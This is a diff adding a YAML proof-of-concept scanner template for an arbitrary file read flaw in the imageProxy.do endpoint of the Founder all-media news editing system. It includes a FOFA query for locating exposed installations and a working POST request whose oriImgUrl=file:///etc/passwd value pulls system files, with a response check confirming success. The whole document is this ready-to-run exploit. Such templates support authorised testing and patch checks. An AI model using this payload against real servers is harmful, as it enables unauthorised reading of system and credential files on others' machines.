@@ -1,0 +1,18 @@
+id: poc-yaml-founder-imageproxy-do-anyfile-read
+info:
+  name: 方正全媒体采编系统 imageProxy.do 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 方正全媒体采编系统
+  fofa: app="FOUNDER-全媒体采编系统"
+requests:
+- method: POST
+  path: /newsedit/outerfotobase/imageProxy.do
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: oriImgUrl=file:///etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<") && contains(content_type,"image/jpeg")
+variables: {}
+transport: http
